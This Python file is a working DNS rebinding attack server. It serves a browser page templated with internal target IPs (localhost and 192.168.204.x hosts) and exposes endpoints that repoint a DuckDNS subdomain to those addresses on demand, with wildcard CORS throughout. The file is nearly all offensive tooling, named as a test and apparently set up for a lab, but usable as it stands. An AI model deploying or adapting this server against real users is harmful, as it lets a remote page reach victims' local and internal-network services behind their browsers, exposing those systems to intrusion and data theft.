from http.server import HTTPServer, BaseHTTPRequestHandler
import json
import time
import requests
import socket 

# Config
PUBLIC_IP = "YOUR_PUBLIC_IP" # Your public IP address (the one hosting the server)
PUBLIC_PORT = "80"
DUCKDNS_DOMAIN = "your-subdomain" # the DuckDNS subdomain you registered (e.g., example.duckdns.org)
DUCKDNS_TOKEN = "xxxxxxxxxx" # Your DuckDNS token (available after creating an account)
REBIND_TARGET = "127.0.0.1" # 

# Configurable target array - modify this as needed
PAYLOAD_TARGETS = [
    "192.168.204.133",
    "192.168.204.131", 
    "192.168.204.134"
]

with open("client.html", "r", encoding="utf-8") as f:
    HTML_TEMPLATE = f.read()

class DynamicDNSRebinderTest(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        pass 

    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()

            js_targets = json.dumps(PAYLOAD_TARGETS)
            
            html = HTML_TEMPLATE.replace("__PUBLIC_IP__", PUBLIC_IP)\
                                .replace("__PUBLIC_PORT__", PUBLIC_PORT)\
                                .replace("__DUCKDNS_DOMAIN__", DUCKDNS_DOMAIN)\
                                .replace("__REBIND_TARGET__", REBIND_TARGET)\
                                .replace("__PAYLOAD_TARGETS__", js_targets)
            self.wfile.write(html.encode())

        elif self.path == '/verify':
            self.send_response(200)
            self.send_header('Content-type', 'text/plain')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            self.wfile.write(f'Server OK - {PUBLIC_IP}'.encode())

        else:
            self.send_response(200)
            self.send_header('Content-type', 'text/plain')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            self.wfile.write(b'Server running')

    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.end_headers()

    def do_POST(self):
        if self.path == '/update-dns':
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()

            try:
                length = int(self.headers.get('Content-Length', 0))
                data = json.loads(self.rfile.read(length).decode())
                target_ip = data.get('target_ip')

                print(f"[+] Updating DuckDNS → {target_ip}")
                url = f"https://www.duckdns.org/update?domains={DUCKDNS_DOMAIN}&token={DUCKDNS_TOKEN}&ip={target_ip}&verbose=true"
                r = requests.get(url, timeout=10)

                if r.status_code == 200 and 'OK' in r.text:
                    self.wfile.write(json.dumps({"success": True}).encode())
                else:
                    self.wfile.write(json.dumps({"success": False, "error": r.text}).encode())
            except Exception as e:
                self.wfile.write(json.dumps({"success": False, "error": str(e)}).encode())
        elif self.path == '/restore-dns':
            self.send_response(200)
            self.send_header('Content-Type', 'application/json')
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()

            try:
                print(f"Restoring DuckDNS to original IP: {PUBLIC_IP}")
                restore_url = f"https://www.duckdns.org/update?domains={DUCKDNS_DOMAIN}&token={DUCKDNS_TOKEN}&ip={PUBLIC_IP}&verbose=true"
                r = requests.get(restore_url, timeout=10)

                if r.status_code == 200 and 'OK' in r.text:
                    result = {"success": True}
                else:
                    result = {"success": False, "error": r.text}
            except Exception as e:
                result = {"success": False, "error": str(e)}

            self.wfile.write(json.dumps(result).encode())

        else:
            self.send_response(404)
            self.send_header('Access-Control-Allow-Origin', '*')
            self.end_headers()
            self.wfile.write(b'Not Found')


def main():
    print(f"Configured payload targets: {PAYLOAD_TARGETS}")
    server = HTTPServer(('0.0.0.0', int(PUBLIC_PORT)), DynamicDNSRebinderTest)
    print(f"Listening on http://{DUCKDNS_DOMAIN}.duckdns.org")
    server.serve_forever()

if __name__ == '__main__':
    main()
